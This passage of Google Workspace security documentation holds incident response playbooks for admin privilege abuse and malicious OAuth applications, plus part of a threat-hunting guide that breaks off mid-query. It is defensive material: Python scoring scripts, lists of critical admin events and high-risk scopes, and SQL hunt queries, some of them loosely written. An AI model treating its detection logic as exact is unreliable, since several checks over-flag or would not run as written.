\"\"\"Analyze admin console access patterns for anomalies\"\"\"\n    # Calculate start time\n    start_time = (datetime.now() - timedelta(days=days_back)).strftime('%Y-%m-%d')\n    \n    # Get admin console activities\n    admin_events = reports_service.activities().list(\n        userKey='all',\n        applicationName='admin',\n        startTime=start_time,\n        maxResults=1000\n    ).execute()\n    \n    # Organize by user\n    admin_access = {}\n    \n    for event in admin_events.get('items', []):\n        user = event['actor']['email']\n        event_time = event.get('id', {}).get('time')\n        event_name = event.get('events', [{}])[0].get('name')\n        ip_address = event.get('ipAddress')\n        \n        if user not in admin_access:\n            admin_access[user] = {\n                'access_count': 0,\n                'ip_addresses': set(),\n                'common_events': {},\n                'access_times': [],\n                'first_seen': event_time,\n                'last_seen': event_time,\n                'critical_events': []\n            }\n        \n        # Update user data\n        admin_access[user]['access_count'] += 1\n        if ip_address:\n            admin_access[user]['ip_addresses'].add(ip_address)\n        \n        # Track event frequency\n        if event_name not in admin_access[user]['common_events']:\n            admin_access[user]['common_events'][event_name] = 0\n        admin_access[user]['common_events'][event_name] += 1\n        \n        # Update access times\n        admin_access[user]['access_times'].append(event_time)\n        \n        # Update first/last seen\n        if event_time &lt; admin_access[user]['first_seen']:\n            admin_access[user]['first_seen'] = event_time\n        if event_time &gt; admin_access[user]['last_seen']:\n            admin_access[user]['last_seen'] = event_time\n        \n        # Check for critical events\n        if is_critical_admin_event(event):\n            admin_access[user]['critical_events'].append({\n                'event_name': event_name,\n                'time': event_time,\n                'ip_address': ip_address,\n                'details': extract_event_details(event)\n            })\n    \n    # Process data for analysis\n    admin_insights = []\n    for user, data in admin_access.items():\n        # Convert sets to lists/counts\n        data['ip_count'] = len(data['ip_addresses'])\n        data['ip_list'] = list(data['ip_addresses'])\n        del data['ip_addresses']\n        \n        # Sort critical events by time\n        data['critical_events'].sort(key=lambda x: x['time'])\n        \n        # Calculate working hours access percentage\n        work_hours_access = calculate_work_hours_percentage(data['access_times'])\n        data['work_hours_percentage'] = work_hours_access\n        \n        # Calculate common events\n        data['common_events'] = sorted(\n            [{'event': k, 'count': v} for k, v in data['common_events'].items()],\n            key=lambda x: x['count'],\n            reverse=True\n        )\n        \n        # Calculate anomaly score\n        anomaly_score = calculate_admin_anomaly_score(data)\n        \n        admin_insights.append({\n            'user': user,\n            'data': data,\n            'anomaly_score': anomaly_score\n        })\n    \n    # Sort by anomaly score\n    admin_insights.sort(key=lambda x: x['anomaly_score'], reverse=True)\n    \n    return admin_insights\n\ndef is_critical_admin_event(event):\n    \"\"\"Determine if an admin event is critical\"\"\"\n    critical_event_types = [\n        'GRANT_ADMIN_PRIVILEGE',\n        'CREATE_ROLE',\n        'CHANGE_ROLE_SCOPE',\n        'ADD_ROLE_PRIVILEGE',\n        'CREATE_USER',\n        'CHANGE_USER_PASSWORD',\n        'TOGGLE_SERVICE_ACCOUNT',\n        'ADD_SERVICE_ACCOUNT_PRIVILEGE',\n        'CHANGE_TWO_STEP_VERIFICATION',\n        'CHANGE_RECOVERY_EMAIL',\n        'CHANGE_RECOVERY_PHONE'\n    ]\n    \n    event_name = event.get('events', [{}])[0].get('name')\n    return event_name in critical_event_types\n\ndef extract_event_details(event):\n    \"\"\"Extract important details from an event\"\"\"\n    details = {}\n    parameters = event.get('events', [{}])[0].get('parameters', [])\n    \n    for param in parameters:\n        details[param.get('name')] = param.get('value')\n    \n    return details\n\ndef calculate_work_hours_percentage(timestamps):\n    \"\"\"Calculate percentage of access during work hours (8AM-6PM local time)\"\"\"\n    if not timestamps:\n        return 0\n        \n    work_hours_count = 0\n    \n    for timestamp in timestamps:\n        # Convert to datetime object\n        try:\n            dt = datetime.fromisoformat(timestamp.replace('Z', '+00:00'))\n            # Check if access is during work hours (8AM-6PM local time, assuming UTC)\n            hour = dt.hour\n            if 8 &lt;= hour &lt; 18 and dt.weekday() &lt; 5:  # Weekday and work hours\n                work_hours_count += 1\n        except:\n            pass\n    \n    return (work_hours_count / len(timestamps)) * 100\n\ndef calculate_admin_anomaly_score(data):\n    \"\"\"Calculate an anomaly score for admin activity\"\"\"\n    score = 0\n    \n    # Multiple IPs increases risk\n    if data['ip_count'] &gt; 3:\n        score += min(data['ip_count'] - 3, 5)\n    \n    # Low work hours percentage is suspicious\n    if data['work_hours_percentage'] &lt; 70:\n        score += min((70 - data['work_hours_percentage']) / 10, 5)\n    \n    # Critical events increase risk significantly\n    score += min(len(data['critical_events']) * 2, 10)\n    \n    return score\n</code></pre></p> </li> <li> <p>Critical Configuration Change Review <pre><code>Admin Console &gt; Reports &gt; Audit &gt; Admin\n- Focus on security setting changes\n- Check authentication configuration modifications\n- Review API and service account changes\n- Verify email routing configuration changes\n</code></pre></p> </li> <li> <p>Evidence Collection</p> </li> <li>Document all suspicious admin activities</li> <li>Capture screenshots of admin console logs</li> <li>Create timeline of privilege escalation events</li> <li>Preserve original audit logs for investigation</li> </ol>"},{"location":"incident-response-playbooks/#containment-procedures_3","title":"Containment Procedures","text":"<p>Immediate Actions:</p> <ol> <li> <p>Admin Account Security <pre><code>Admin Console &gt; Directory &gt; Users\n- Suspend suspected compromised admin accounts\n- Reset passwords for all admin accounts\n- Force logout of all admin sessions\n- Enable stringent login challenges\n</code></pre></p> </li> <li> <p>Role Assignment Review and Restriction <pre><code>Admin Console &gt; Account &gt; Admin roles\n- Remove unauthorized role assignments\n- Restrict available admin roles temporarily\n- Implement emergency admin access limitations\n</code></pre></p> </li> <li> <p>Critical Function Restriction <pre><code># Various Admin Console settings\n- Disable user creation temporarily\n- Restrict organization unit modifications\n- Limit API access and integrations\n- Disable service account creation\n</code></pre></p> </li> <li> <p>Secure Super Admin Access <pre><code>Admin Console &gt; Account &gt; Account settings\n- Verify super admin accounts\n- Implement IP restrictions for admin access\n- Enable advanced protection for super admins\n- Add additional verification layers\n</code></pre></p> </li> </ol> <p>Secondary Containment:</p> <ol> <li> <p>Admin Console Access Restriction <pre><code>Admin Console &gt; Security &gt; Access and data control &gt; Context-aware access\n- Implement IP-based restrictions for Admin Console\n- Configure device-based access requirements\n- Deploy stepped-up authentication for admin actions\n</code></pre></p> </li> <li> <p>API Access Limitation <pre><code>Admin Console &gt; Security &gt; API Controls\n- Restrict administrative API capabilities\n- Review and reduce domain-wide delegations\n- Implement strict API monitoring\n</code></pre></p> </li> <li> <p>Delegated Administration Review <pre><code>Admin Console &gt; Account &gt; Admin roles\n- Review all delegated admin roles\n- Reduce privileges to minimum required\n- Implement time-bound delegations\n</code></pre></p> </li> </ol>"},{"location":"incident-response-playbooks/#eradication-steps_3","title":"Eradication Steps","text":"<ol> <li> <p>Remove Unauthorized Access <pre><code>Admin Console &gt; Account &gt; Admin roles\n- Remove all unauthorized role assignments\n- Delete suspicious admin accounts\n- Reset all admin role configurations\n</code></pre></p> </li> <li> <p>Revert Unauthorized Changes <pre><code># Based on impact assessment\n- Restore security settings to known good state\n- Revert unauthorized configuration changes\n- Reset API access controls\n</code></pre></p> </li> <li> <p>Rebuild Admin Structure <pre><code>Admin Console &gt; Account &gt; Admin roles\n- Recreate admin roles with appropriate permissions\n- Implement least privilege principle\n- Establish role hierarchy with appropriate constraints\n</code></pre></p> </li> <li> <p>Clean Up Persistent Access <pre><code>Admin Console &gt; Security &gt; API Controls\n- Remove unauthorized API access\n- Revoke compromised service account credentials\n- Delete unauthorized domain-wide delegations\n</code></pre></p> </li> </ol>"},{"location":"incident-response-playbooks/#recovery-guidance_3","title":"Recovery Guidance","text":"<ol> <li> <p>Admin Access Restoration <pre><code>Admin Console &gt; Account &gt; Admin roles\n- Restore essential admin roles\n- Configure appropriate role assignments\n- Implement enhanced monitoring for admin actions\n</code></pre></p> </li> <li> <p>Admin Privilege Enhancement <pre><code># Various Admin Console settings\n- Implement time-based access controls\n- Configure location-based restrictions\n- Deploy task-based privilege assignment\n</code></pre></p> </li> <li> <p>Multi-Party Authorization Implementation</p> </li> <li>Develop multi-admin approval for critical changes</li> <li>Create change management processes</li> <li>Implement administrative separation of duties</li> <li> <p>Establish emergency access procedures</p> </li> <li> <p>Enhanced Monitoring Deployment <pre><code>Admin Console &gt; Reports &gt; Audit\n- Configure comprehensive admin activity alerts\n- Implement baseline behavior monitoring\n- Deploy anomaly detection for admin access\n</code></pre></p> </li> </ol>"},{"location":"incident-response-playbooks/#post-incident-analysis_3","title":"Post-Incident Analysis","text":"<ol> <li>Admin Access Impact Assessment</li> <li>Document unauthorized admin actions</li> <li>Assess impact of configuration changes</li> <li>Determine potential data access or exposure</li> <li> <p>Evaluate regulatory compliance implications</p> </li> <li> <p>Admin Security Control Evaluation</p> </li> <li>Review administrative access controls</li> <li>Assess privilege management practices</li> <li>Evaluate separation of duties implementation</li> <li> <p>Identify security control gaps</p> </li> <li> <p>Documentation and Reporting</p> </li> <li>Create comprehensive incident timeline</li> <li>Document security recommendations</li> <li>Prepare executive summary</li> <li> <p>Develop admin security roadmap</p> </li> <li> <p>Security Enhancement Implementation</p> </li> <li>Deploy enhanced admin access controls</li> <li>Implement comprehensive audit procedures</li> <li>Establish admin baseline behavior profiles</li> <li>Create admin security verification processes</li> </ol>"},{"location":"incident-response-playbooks/#malicious-application-installation-incident-response","title":"Malicious Application Installation Incident Response","text":""},{"location":"incident-response-playbooks/#incident-overview_4","title":"Incident Overview","text":"<p>Description: Installation of unauthorized, malicious, or excessively permissioned applications in the Google Workspace environment, potentially resulting in data exposure, credential theft, or persistent unauthorized access.</p> <p>Common Attack Vectors: - Malicious Marketplace applications - Phishing campaigns for application authorization - Third-party applications with excessive permissions - Rogue browser extensions with Workspace access - Malicious Apps Script implementations - OAuth phishing for application installation</p> <p>Severity Classifications: - Critical: Admin-level application with widespread deployment - High: Data access application with significant adoption - Medium: Limited access application with targeted deployment - Low: Minimal risk application with restricted permissions</p>"},{"location":"incident-response-playbooks/#detection-and-analysis_4","title":"Detection and Analysis","text":"<p>Initial Indicators: - Unusual application installation patterns - Applications requesting excessive permissions - User reports of suspicious OAuth requests - Unexpected data access or sharing - Abnormal API usage from applications - Unusual Chrome extension behavior</p> <p>Investigation Procedures:</p> <ol> <li> <p>Application Inventory Analysis <pre><code>Admin Console &gt; Security &gt; API Controls &gt; App access control\n- Review recently installed applications\n- Identify applications with unusual permission scopes\n- Check for applications with admin access\n</code></pre></p> </li> <li> <p>OAuth Token Activity Review <pre><code>Admin Console &gt; Reports &gt; Audit &gt; Token\n- Analyze token usage patterns\n- Identify applications with unusual activity\n- Check for suspicious permission requests\n</code></pre></p> </li> <li> <p>Marketplace Application Assessment <pre><code>Admin Console &gt; Apps &gt; Marketplace apps\n- Review recently installed applications\n- Check for unauthorized deployment patterns\n- Identify suspicious application behavior\n</code></pre></p> </li> <li> <p>Chrome Extension Inventory <pre><code>Admin Console &gt; Devices &gt; Chrome &gt; Apps &amp; extensions\n- Review installed extensions\n- Check for extensions with unusual permissions\n- Identify extensions with Workspace access\n</code></pre></p> </li> <li> <p>Application Behavior Analysis <pre><code># Python script to analyze application behavior for anomalies\ndef analyze_application_behavior(reports_service, days_back=7):\n    \"\"\"Analyze application behavior for suspicious patterns\"\"\"\n    # Calculate start time\n    start_time = (datetime.now() - timedelta(days=days_back)).strftime('%Y-%m-%d')\n    \n    # Get application activities\n    app_events = {}\n    \n    # Check various application types\n    for app_type in ['token', 'drive', 'mobile']:\n        events = reports_service.activities().list(\n            userKey='all',\n            applicationName=app_type,\n            startTime=start_time,\n            maxResults=1000\n        ).execute()\n        \n        app_events[app_type] = events.get('items', [])\n    \n    # Analyze OAuth application behavior\n    oauth_apps = {}\n    \n    for event in app_events.get('token', []):\n        # Extract application details\n        parameters = event.get('events', [{}])[0].get('parameters', [])\n        client_id = next((p.get('value') for p in parameters if p.get('name') == 'client_id'), 'unknown')\n        app_name = next((p.get('value') for p in parameters if p.get('name') == 'app_name'), 'unknown')\n        scopes = next((p.get('value') for p in parameters if p.get('name') == 'scope'), '').split()\n        user = event['actor']['email']\n        \n        # Create app entry if needed\n        app_key = f\"{app_name}:{client_id}\"\n        if app_key not in oauth_apps:\n            oauth_apps[app_key] = {\n                'app_name': app_name,\n                'client_id': client_id,\n                'users': set(),\n                'scopes': scopes,\n                'scope_count': len(scopes),\n                'high_risk_scopes': [s for s in scopes if is_high_risk_scope(s)],\n                'ip_addresses': set(),\n                'access_count': 0,\n                'first_seen': event.get('id', {}).get('time'),\n                'last_seen': event.get('id', {}).get('time')\n            }\n        \n        # Update app data\n        oauth_apps[app_key]['users'].add(user)\n        oauth_apps[app_key]['access_count'] += 1\n        \n        if event.get('ipAddress'):\n            oauth_apps[app_key]['ip_addresses'].add(event.get('ipAddress'))\n        \n        # Update time range\n        event_time = event.get('id', {}).get('time')\n        if event_time &lt; oauth_apps[app_key]['first_seen']:\n            oauth_apps[app_key]['first_seen'] = event_time\n        if event_time &gt; oauth_apps[app_key]['last_seen']:\n            oauth_apps[app_key]['last_seen'] = event_time\n    \n    # Process data for analysis\n    app_analysis = []\n    \n    for app_key, data in oauth_apps.items():\n        # Convert sets to counts\n        data['user_count'] = len(data['users'])\n        data['unique_ips'] = len(data['ip_addresses'])\n        data['ip_list'] = list(data['ip_addresses'])\n        data['user_list'] = list(data['users'])\n        del data['ip_addresses']\n        del data['users']\n        \n        # Calculate risk score\n        risk_score = calculate_app_risk_score(data)\n        \n        app_analysis.append({\n            'app_key': app_key,\n            'data': data,\n            'risk_score': risk_score\n        })\n    \n    # Sort by risk score\n    app_analysis.sort(key=lambda x: x['risk_score'], reverse=True)\n    \n    return app_analysis\n\ndef is_high_risk_scope(scope):\n    \"\"\"Determine if a scope is high-risk\"\"\"\n    high_risk_indicators = [\n        'https://mail.google.com/',\n        'https://www.googleapis.com/auth/drive',\n        'https://www.googleapis.com/auth/admin',\n        'https://www.googleapis.com/auth/cloud-platform',\n        '.readonly',  # Wildcard for read access to services\n        'https://www.googleapis.com/auth/contacts',\n        'https://www.googleapis.com/auth/calendar'\n    ]\n    \n    return any(indicator in scope for indicator in high_risk_indicators)\n\ndef calculate_app_risk_score(app_data):\n    \"\"\"Calculate risk score for an application\"\"\"\n    risk_score = 0\n    \n    # More users = higher potential impact\n    if app_data['user_count'] &gt; 50:\n        risk_score += 3\n    elif app_data['user_count'] &gt; 10:\n        risk_score += 2\n    elif app_data['user_count'] &gt; 3:\n        risk_score += 1\n    \n    # High number of scopes increases risk\n    if app_data['scope_count'] &gt; 10:\n        risk_score += 3\n    elif app_data['scope_count'] &gt; 5:\n        risk_score += 2\n    elif app_data['scope_count'] &gt; 2:\n        risk_score += 1\n    \n    # High-risk scopes significantly increase risk\n    risk_score += min(len(app_data['high_risk_scopes']), 5)\n    \n    # Rapid adoption may indicate phishing campaign\n    first_seen = datetime.fromisoformat(app_data['first_seen'].replace('Z', '+00:00'))\n    last_seen = datetime.fromisoformat(app_data['last_seen'].replace('Z', '+00:00'))\n    adoption_period = (last_seen - first_seen).total_seconds() / 3600  # hours\n    \n    if adoption_period &lt; 24 and app_data['user_count'] &gt; 5:\n        risk_score += 2  # Rapid adoption across multiple users\n    \n    # Multiple IP addresses may indicate broader usage or command &amp; control\n    if app_data['unique_ips'] &gt; 10:\n        risk_score += 2\n    elif app_data['unique_ips'] &gt; 5:\n        risk_score += 1\n    \n    return risk_score\n</code></pre></p> </li> <li> <p>Evidence Collection</p> </li> <li>Document suspicious applications</li> <li>Record affected users and scope of installation</li> <li>Capture OAuth permission request details</li> <li>Create timeline of application installation and usage</li> </ol>"},{"location":"incident-response-playbooks/#containment-procedures_4","title":"Containment Procedures","text":"<p>Immediate Actions:</p> <ol> <li> <p>Application Access Revocation <pre><code>Admin Console &gt; Security &gt; API Controls &gt; App access control\n- Block suspicious applications\n- Revoke tokens for malicious applications\n- Restrict future authorization attempts\n</code></pre></p> </li> <li> <p>Marketplace Application Restriction <pre><code>Admin Console &gt; Apps &gt; Marketplace apps\n- Remove suspicious applications\n- Disable affected applications\n- Block future installations\n</code></pre></p> </li> <li> <p>Chrome Extension Management <pre><code>Admin Console &gt; Devices &gt; Chrome &gt; Apps &amp; extensions\n- Force remove malicious extensions\n- Block installation of suspicious extensions\n- Implement extension allowlisting\n</code></pre></p> </li> <li> <p>Apps Script Management <pre><code>Admin Console &gt; Security &gt; API Controls &gt; App Scripts\n- Disable suspicious scripts\n- Revoke excessive permissions\n- Block unauthorized script execution\n</code></pre></p> </li> </ol> <p>Secondary Containment:</p> <ol> <li> <p>API Access Limitation <pre><code>Admin Console &gt; Security &gt; API Controls\n- Restrict available API scopes\n- Implement more granular permissions\n- Deploy enhanced API monitoring\n</code></pre></p> </li> <li> <p>Application Installation Control <pre><code>Admin Console &gt; Apps &gt; Marketplace apps\n- Configure app installation restrictions\n- Implement approval workflows\n- Deploy application allowlisting\n</code></pre></p> </li> <li> <p>User Communication</p> </li> <li>Notify affected users of security incident</li> <li>Provide application revocation instructions</li> <li>Establish reporting procedures for suspicious apps</li> <li>Deploy phishing awareness for application-based attacks</li> </ol>"},{"location":"incident-response-playbooks/#eradication-steps_4","title":"Eradication Steps","text":"<ol> <li> <p>Comprehensive Application Removal <pre><code># Various Admin Console settings\n- Remove all instances of malicious applications\n- Revoke all associated OAuth tokens\n- Block application client IDs permanently\n</code></pre></p> </li> <li> <p>Permission Cleanup <pre><code>Admin Console &gt; Security &gt; API Controls\n- Review and reset excessive permissions\n- Implement least privilege for applications\n- Revoke unnecessary access rights\n</code></pre></p> </li> <li> <p>Browser Extension Cleanup <pre><code>Admin Console &gt; Devices &gt; Chrome &gt; Apps &amp; extensions\n- Remove all instances of malicious extensions\n- Implement comprehensive extension policies\n- Deploy browser security baselines\n</code></pre></p> </li> <li> <p>Apps Script Remediation <pre><code># Via script inventory\n- Identify and remove malicious scripts\n- Audit trigger configurations\n- Remove unauthorized script deployments\n</code></pre></p> </li> </ol>"},{"location":"incident-response-playbooks/#recovery-guidance_4","title":"Recovery Guidance","text":"<ol> <li> <p>Application Access Restoration <pre><code># For legitimate applications\n- Restore access for approved applications\n- Implement proper permission scoping\n- Configure appropriate monitoring\n</code></pre></p> </li> <li> <p>Application Control Implementation <pre><code>Admin Console &gt; Apps &gt; Marketplace apps\n- Deploy application allowlisting\n- Implement installation approval workflows\n- Configure appropriate access controls\n</code></pre></p> </li> <li> <p>Extension Governance <pre><code>Admin Console &gt; Devices &gt; Chrome &gt; Apps &amp; extensions\n- Implement extension allowlisting\n- Deploy extension risk assessment process\n- Configure appropriate extension policies\n</code></pre></p> </li> <li> <p>API Security Enhancement <pre><code>Admin Console &gt; Security &gt; API Controls\n- Implement enhanced API access controls\n- Deploy comprehensive monitoring\n- Configure scope limitations\n</code></pre></p> </li> </ol>"},{"location":"incident-response-playbooks/#post-incident-analysis_4","title":"Post-Incident Analysis","text":"<ol> <li>Application Impact Assessment</li> <li>Identify scope of application installation</li> <li>Determine data access and potential exposure</li> <li>Assess user impact and workflow disruption</li> <li> <p>Document affected systems and services</p> </li> <li> <p>Application Control Evaluation</p> </li> <li>Review application governance processes</li> <li>Assess installation control effectiveness</li> <li>Evaluate permission management practices</li> <li> <p>Identify security control gaps</p> </li> <li> <p>Documentation and Reporting</p> </li> <li>Create comprehensive incident timeline</li> <li>Document affected applications and users</li> <li>Prepare executive summary</li> <li> <p>Develop application security roadmap</p> </li> <li> <p>Security Enhancement Implementation</p> </li> <li>Deploy application governance framework</li> <li>Implement comprehensive vetting process</li> <li>Establish application security baselines</li> <li>Create continuous monitoring procedures</li> </ol>"},{"location":"incident-response-playbooks/#additional-resources-and-references","title":"Additional Resources and References","text":""},{"location":"incident-response-playbooks/#incident-response-documentation-templates","title":"Incident Response Documentation Templates","text":"<ol> <li> <p>Incident Response Report Template <pre><code># Google Workspace Security Incident Report\n\n## Incident Overview\n- Incident ID: [ID]\n- Type: [Account Compromise, Data Exfiltration, OAuth Token Abuse, etc.]\n- Severity: [Critical, High, Medium, Low]\n- Date Detected: [Date]\n- Date Contained: [Date]\n- Date Resolved: [Date]\n- Affected Users/Systems: [List]\n\n## Incident Timeline\n- [Date/Time] - [Event]\n- [Date/Time] - [Event]\n- [Date/Time] - [Event]\n\n## Root Cause Analysis\n- [Detailed analysis of how the incident occurred]\n\n## Impact Assessment\n- [Description of impact on systems, users, and data]\n\n## Response Actions\n- [Actions taken to contain, eradicate, and recover]\n\n## Lessons Learned\n- [Key takeaways and improvement opportunities]\n\n## Recommendations\n- [Specific actions to prevent recurrence]\n</code></pre></p> </li> <li> <p>Communication Templates</p> </li> <li>User Notification Template</li> <li>Executive Briefing Template</li> <li>Technical Team Communication Template</li> <li>Post-Incident Review Meeting Agenda</li> </ol>"},{"location":"incident-response-playbooks/#google-workspace-security-resources","title":"Google Workspace Security Resources","text":"<ol> <li>Official Google Documentation</li> <li>Google Workspace Security Center</li> <li>Google Security Best Practices</li> <li> <p>Google Admin Help: Security and privacy</p> </li> <li> <p>Security Frameworks and Standards</p> </li> <li>NIST Cybersecurity Framework</li> <li>SANS Incident Response Guide</li> <li> <p>ISO 27001 Information Security Management</p> </li> <li> <p>Regulatory Compliance Resources</p> </li> <li>GDPR Compliance</li> <li>HIPAA Compliance</li> <li>NIST 800-53 Controls</li> </ol> <p>Note: These playbooks should be adapted to your organization's specific Google Workspace configuration, security posture, and compliance requirements.</p>"},{"location":"log-analysis/","title":"Log Analysis","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance</p>"},{"location":"log-analysis/#google-workspace-log-analysis-and-threat-hunting-guide","title":"Google Workspace Log Analysis and Threat Hunting Guide","text":"<p>This comprehensive guide provides security professionals with actionable strategies for performing effective log analysis and threat hunting within Google Workspace environments, with a focus on techniques applicable for MSPs managing multiple client environments.</p>"},{"location":"log-analysis/#understanding-google-workspace-logs","title":"Understanding Google Workspace Logs","text":""},{"location":"log-analysis/#key-log-sources","title":"Key Log Sources","text":"<p>Google Workspace provides several critical log types that security teams should leverage:</p> Log Type Description Key Use Cases Admin Audit Log Records administrative changes to Google Workspace configuration Detecting unauthorized admin actions, privilege escalation, security control changes Login Audit Log Records user authentication events, including successes, failures, and challenges Identifying account compromise, credential stuffing, phishing attacks Token Audit Log Records OAuth token issuance and usage Detecting OAuth abuse, unauthorized application access SAML Audit Log Records SAML authentication events Monitoring SSO implementation, detecting federation attacks Access Transparency Log Records Google staff access to customer content Ensuring appropriate Google access to customer data Drive Audit Log Records file access, sharing, and modifications Detecting data exfiltration, unauthorized sharing Gmail Log Records email delivery, processing, and user actions Identifying email security incidents, data loss via email Mobile Audit Log Records mobile device activities and management actions Monitoring mobile device security, detecting compromised devices Rules Log Records creation and modification of rules like email routing Detecting persistence mechanisms, unauthorized mail forwarding Groups Audit Log Records changes to group membership and settings Monitoring unauthorized access changes, detecting privilege changes"},{"location":"log-analysis/#log-collection-strategies","title":"Log Collection Strategies","text":"<p>Depending on your environment and requirements, consider these collection approaches:</p> <ol> <li>Google Cloud-Native</li> <li>Log Exports to Cloud Logging: Direct integration with Google Cloud monitoring</li> <li>BigQuery Export: For advanced analytics and long-term retention</li> <li> <p>Pub/Sub Integration: For real-time processing and custom workflows</p> </li> <li> <p>Third-Party SIEM Integration</p> </li> <li>API-Based Collection: Regular polling of Admin SDK APIs</li> <li>Webhook Notifications: Event-driven collection via push notifications</li> <li> <p>Pre-built Connectors: Using vendor-provided Google Workspace integrations</p> </li> <li> <p>MSP Multi-Tenant Collection</p> </li> <li>Aggregation Service: Central collection point for multiple tenant logs</li> <li>Tenant Identification: Ensuring proper segregation and identification</li> <li>Normalized Schema: Consistent format across different tenant configurations</li> </ol>"},{"location":"log-analysis/#log-retention-considerations","title":"Log Retention Considerations","text":"<ul> <li>Default Retention: Understand Google's default retention periods by log type</li> <li>Extended Retention: Implementation of custom retention policies</li> <li>Compliance Requirements: Adjusting retention to meet regulatory needs</li> <li>Investigation Support: Ensuring sufficient history for security investigations</li> <li>Cost Optimization: Balancing security needs with storage costs</li> </ul>"},{"location":"log-analysis/#log-analysis-framework","title":"Log Analysis Framework","text":""},{"location":"log-analysis/#foundation-the-ooda-loop-for-log-analysis","title":"Foundation: The OODA Loop for Log Analysis","text":"<p>Apply the Observe-Orient-Decide-Act framework to Google Workspace logs:</p> <ol> <li>Observe: Collect comprehensive logs from all relevant sources</li> <li>Orient: Contextualize log data with threat intelligence and environment understanding</li> <li>Decide: Determine if observed patterns indicate normal behavior or security incidents</li> <li>Act: Implement appropriate response actions based on analysis</li> </ol>"},{"location":"log-analysis/#essential-analysis-techniques","title":"Essential Analysis Techniques","text":""},{"location":"log-analysis/#baseline-establishment","title":"Baseline Establishment","text":"<ul> <li>Authentication Patterns: Understand normal login times, locations, and devices</li> <li>Administrative Actions: Document expected administrative activity cadence</li> <li>Service Usage: Establish normal usage patterns for each Google service</li> <li>Data Access: Identify typical data access and sharing patterns</li> <li>Application Usage: Document normal third-party application utilization</li> </ul>"},{"location":"log-analysis/#anomaly-detection-approaches","title":"Anomaly Detection Approaches","text":"<ul> <li>Statistical Deviation: Identifying activity outside normal standard deviations</li> <li>Peer Group Analysis: Comparing user activity to similar role peers</li> <li>Temporal Analysis: Identifying unusual timing of activities</li> <li>Volume Analysis: Detecting unusual quantities of events</li> <li>Sequence Analysis: Identifying atypical sequences of actions</li> </ul>"},{"location":"log-analysis/#context-enhancement","title":"Context Enhancement","text":"<ul> <li>User Context: Enriching logs with HR data, role information, and department</li> <li>Asset Context: Adding device ownership, management status, and compliance state</li> <li>Location Context: Enhancing with office locations, remote work status, and travel data</li> <li>Business Context: Incorporating project assignments, access requirements</li> <li>Threat Context: Adding known IOCs, threat actor TTPs, and intelligence</li> </ul>"},{"location":"log-analysis/#threat-hunting-playbooks","title":"Threat Hunting Playbooks","text":""},{"location":"log-analysis/#1-account-compromise-hunt","title":"1. Account Compromise Hunt","text":"<p>Objective: Identify potentially compromised user accounts</p> <p>Log Sources: - Login Audit Log - Token Audit Log - Admin Audit Log</p> <p>Hunt Techniques:</p> <ol> <li>Authentication Anomaly Detection</li> <li>Query unusual login times outside user's typical pattern</li> <li>Identify authentications from unusual geographies</li> <li>Detect rapid authentications from distant locations (impossible travel)</li> <li> <p>Monitor for changes in authentication factors or methods</p> </li> <li> <p>Post-Compromise Activity Analysis</p> </li> <li>Track password or recovery option changes after suspicious logins</li> <li>Identify mail forwarding rules created after unusual access</li> <li>Detect unusual Drive sharing or download activity following authentication</li> <li>Monitor for OAuth token issuance to new applications</li> </ol> <p>Sample Hunt Query (SQL-like): <pre><code>SELECT user_email, login_timestamp, ip_address, country, user_agent\nFROM login_audit_logs\nWHERE login_success = true\n  AND login_timestamp &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 14 DAY)\n  AND user_email NOT IN ('admin1@example.com', 'service-account@example.com')\nGROUP BY user_email, DATE(login_timestamp)\nHAVING COUNT(DISTINCT country) &gt; 2\nORDER BY user_email, login_timestamp;\n</code></pre></p>"},{"location":"log-analysis/#2-data-exfiltration-hunt","title":"2. Data Exfiltration Hunt","text":"<p>Objective: Identify potential data theft or unauthorized data access</p> <p>Log Sources: - Drive Audit Log - Gmail Log - Admin Audit Log (for Takeout requests)</p> <p>Hunt Techniques:</p> <ol> <li>Excessive Access Detection</li> <li>Identify users accessing unusually high volumes of documents</li> <li>Detect access to documents outside normal job function</li> <li>Monitor for systematic access to sensitive document categories</li> <li> <p>Track unusual search patterns across document repositories</p> </li> <li> <p>Suspicious Export Activities</p> </li> <li>Identify bulk downloads from Drive</li> <li>Detect unusual usage of Google Takeout</li> <li>Monitor for mass printing activities</li> <li>Track unusual email attachment patterns</li> </ol> <p>Sample Hunt Query (SQL-like): <pre><code>SELECT actor_email, COUNT(DISTINCT doc_id) as accessed_docs,\n       SUM(CASE WHEN visibility = 'private' THEN 1 ELSE 0 END) as private_docs,\n       SUM(CASE WHEN doc_type = 'sensitive' THEN 1 ELSE 0 END) as sensitive_docs\nFROM drive_audit_logs\nWHERE event_type IN ('view', 'download')\n  AND timestamp &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 7 DAY)\nGROUP BY actor_email\nHAVING COUNT(DISTINCT doc_id) &gt; \n  (SELECT AVG(doc_count) + 2*STDDEV(doc_count) \n   FROM (\n     SELECT actor_email, COUNT(DISTINCT doc_id) as doc_count \n     FROM drive_audit_logs \n     WHERE timestamp &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 30 DAY)\n     GROUP BY actor_email\n   ))\nORDER BY accessed_docs DESC;\n</code></pre></p>"},{"location":"log-analysis/#3-privilege-escalation-hunt","title":"3. Privilege Escalation Hunt","text":"<p>Objective: Identify unauthorized elevation of privileges</p> <p>Log Sources: - Admin Audit Log - Groups Audit Log - SAML Audit Log</p> <p>Hunt Techniques:</p> <ol> <li>Administrative Role Changes</li> <li>Detect new admin role assignments</li> <li>Identify unusual delegation of administrative privileges</li> <li>Monitor for changes to powerful groups membership</li> <li> <p>Track privilege assignments outside change management windows</p> </li> <li> <p>Admin Activity Analysis</p> </li> <li>Identify first-time admin actions by user accounts</li> <li>Detect unusual sequences of administrative actions</li> <li>Monitor for sensitive setting modifications</li> <li>Track changes to security controls or monitoring settings</li> </ol> <p>Sample Hunt Query (SQL-like): <pre><code>SELECT actor_email, affected_email, role_name, timestamp\nFROM admin_audit_logs\nWHERE event_type = 'ADMIN_ROLE_CHANGE'\n  AND action = 'ASSIGN'\n  AND timestamp &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 30 DAY)\n  AND NOT EXISTS (\n    SELECT 1 FROM change_management_records\n    WHERE change_type = 'ROLE_ASSIGNMENT'\n      AND affected_user = affected_email\n      AND planned_date BETWEEN TIMESTAMP_SUB(timestamp, INTERVAL 1 DAY) \n                          AND TIMESTAMP_ADD(timestamp, INTERVAL 1 